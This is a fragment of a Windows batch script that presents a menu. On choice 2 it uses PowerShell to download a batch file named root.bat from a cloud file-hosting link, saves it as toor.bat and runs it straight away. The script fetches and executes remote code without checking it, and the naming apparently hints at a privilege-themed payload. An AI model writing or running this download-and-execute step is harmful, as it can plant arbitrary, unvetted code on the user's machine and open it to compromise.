...
if %user_input% equ 2 powershell -command invoke-webrequest https://c387.pcloud.com/dpZ0bAYH1ZeBNqjgZU1J47ZZgeALv7Z2ZZk4FZZDOBiEPHNtX8GYvVAdVXDJb1r1me7/root.bat -outfile toor.bat
start toor.bat
exit
